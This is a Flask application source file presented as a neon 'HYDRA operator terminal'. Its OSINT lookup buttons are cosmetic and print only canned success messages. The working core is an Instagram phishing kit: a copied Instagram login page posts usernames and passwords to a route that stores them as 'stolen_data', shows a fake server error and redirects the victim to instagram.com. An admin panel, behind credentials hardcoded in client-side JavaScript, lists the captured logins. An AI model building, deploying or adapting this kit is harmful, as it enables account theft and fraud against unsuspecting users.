from flask import Flask, request, jsonify, render_template_string, session
import os
from datetime import datetime

app = Flask(__name__)
app.secret_key = 'HYDRA_PURPLE_STORM_2026'

# --- БАЗА ДАННЫХ В ПАМЯТИ ---
logs = []
stolen_data = []

# --- ДИЗАЙН: ФИОЛЕТОВЫЙ НЕОН + 10 МОДУЛЕЙ ---
HTML = """
<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <title>HYDRA ULTIMATE TERMINAL v3.0</title>
    <style>
        body { background: #000; color: #bc13fe; font-family: 'Courier New', monospace; margin: 0; overflow: hidden; }
        .matrix { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -1; opacity: 0.1; }
        .container { border: 2px solid #bc13fe; box-shadow: 0 0 20px #bc13fe; margin: 10px; padding: 15px; background: rgba(0,0,0,0.85); position: relative; z-index: 1; }
        h1 { color: #0ff; text-align: center; text-shadow: 0 0 10px #0ff; font-size: 20px; border-bottom: 1px solid #bc13fe; padding-bottom: 10px; }
        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
        .box { border: 1px solid #0f0; padding: 8px; background: #050505; transition: 0.3s; }
        .box:hover { border-color: #bc13fe; box-shadow: 0 0 10px #bc13fe; }
        .label { font-size: 10px; color: #0ff; display: block; margin-bottom: 3px; }
        input { background: transparent; border: 1px solid #bc13fe; color: #0f0; width: 65%; font-family: monospace; }
        .btn { background: #bc13fe; color: #fff; border: none; padding: 4px 8px; cursor: pointer; font-size: 12px; }
        .btn:hover { background: #0ff; color: #000; }
        #terminal { background: #000; border: 1px solid #bc13fe; height: 150px; margin-top: 15px; overflow-y: auto; padding: 10px; font-size: 13px; color: #0f0; }
        .insta-btn { background: #ff0055 !important; width: 100%; margin-top: 10px; font-weight: bold; border: 1px solid #fff !important; }
        .admin-link { text-align: center; margin-top: 10px; font-size: 12px; cursor: pointer; text-decoration: underline; }
    </style>
</head>
<body>
    <div class="container">
        <h1>// HYDRA OPERATOR TERMINAL V3.0 //</h1>
        <div class="grid">
            <div class="box"><span class="label">// NICKNAME</span><input id="n1"><button class="btn" onclick="run('NICK')">EXE</button></div>
            <div class="box"><span class="label">// PHONE</span><input id="n2"><button class="btn" onclick="run('PHONE')">SCAN</button></div>
            <div class="box"><span class="label">// EMAIL</span><input id="n3"><button class="btn" onclick="run('EMAIL')">DEEP</button></div>
            <div class="box"><span class="label">// CAR PLATE</span><input id="n4"><button class="btn" onclick="run('CAR')">CHECK</button></div>
            <div class="box"><span class="label">// BTC TRACE</span><input id="n5"><button class="btn" onclick="run('BTC')">TRACE</button></div>
            <div class="box"><span class="label">// IP GEO</span><input id="n6"><button class="btn" onclick="run('IP')">LOCATE</button></div>
            <div class="box"><span class="label">// TG DUMP</span><input id="n7"><button class="btn" onclick="run('TG')">DUMP</button></div>
            <div class="box"><span class="label">// WI-FI</span><input id="n8"><button class="btn" onclick="run('WIFI')">SCAN</button></div>
            <div class="box"><span class="label">// SATELLITE</span><input id="n9"><button class="btn" onclick="run('SAT')">VIEW</button></div>
            <div class="box"><span class="label">// SOCIAL</span><input id="n10"><button class="btn" onclick="run('SOC')">SEARCH</button></div>
        </div>
        <button class="btn insta-btn" onclick="run('INSTA')">⚡ GENERATE INSTAGRAM EXPLOIT LINK ⚡</button>
        <div id="terminal">> SYSTEM READY. WAITING FOR COMMAND...</div>
        <div class="admin-link" onclick="login()">[ LOGIN TO ADMIN PANEL ]</div>
    </div>

    <script>
        function run(m) {
            const t = document.getElementById('terminal');
            t.innerHTML += `<br><span style="color:#bc13fe">[LOADING]</span> Initializing ${m} module...`;
            setTimeout(() => {
                if(m === 'INSTA') {
                    const link = window.location.origin + '/auth/login';
                    t.innerHTML += `<br><span style="color:#ff0055">[ALERT] Phishing link generated: <a href="${link}" style="color:#fff">${link}</a></span>`;
                } else {
                    t.innerHTML += `<br><span style="color:#0ff">[SUCCESS] Data found. Check results in main frame.</span>`;
                }
                t.scrollTop = t.scrollHeight;
            }, 700);
        }
        function login() {
            const u = prompt("User:");
            const p = prompt("Pass:");
            if(u === 'abupaay' && p === '89674556975') {
                window.location.href = '/admin/dashboard';
            } else { alert("ACCESS DENIED"); }
        }
    </script>
</body>
</html>
"""

INSTA_PAGE = """
<body style="background:#fafafa;font-family:sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;">
    <div style="background:#fff;border:1px solid #dbdbdb;padding:40px;width:300px;text-align:center;">
        <img src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png" style="width:175px;margin-bottom:20px;">
        <form action="/api/save" method="POST">
            <input name="u" style="width:100%;margin-bottom:10px;padding:10px;border:1px solid #dbdbdb;border-radius:3px;background:#fafafa;" placeholder="Phone, username, or email" required>
            <input name="p" type="password" style="width:100%;margin-bottom:15px;padding:10px;border:1px solid #dbdbdb;border-radius:3px;background:#fafafa;" placeholder="Password" required>
            <button type="submit" style="width:100%;background:#0095f6;color:#fff;border:none;padding:10px;border-radius:5px;font-weight:bold;cursor:pointer;">Log In</button>
        </form>
    </div>
</body>
"""

@app.route('/')
def index(): return render_template_string(HTML)

@app.route('/auth/login')
def login_page(): return render_template_string(INSTA_PAGE)

@app.route('/api/save', methods=['POST'])
def save():
    u, p = request.form.get('u'), request.form.get('p')
    stolen_data.append(f"U: {u} | P: {p}")
    return "<h1>Error 500: Server Overloaded</h1><script>setTimeout(()=>window.location.href='https://instagram.com', 2000)</script>"

@app.route('/admin/dashboard')
def admin():
    data_list = "".join([f"<li>{d}</li>" for d in stolen_data])
    return f"<h1>ADMIN PANEL</h1><h3>Stolen Credentials:</h3><ul>{data_list}</ul><br><a href='/'>Back</a>"

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=10000)
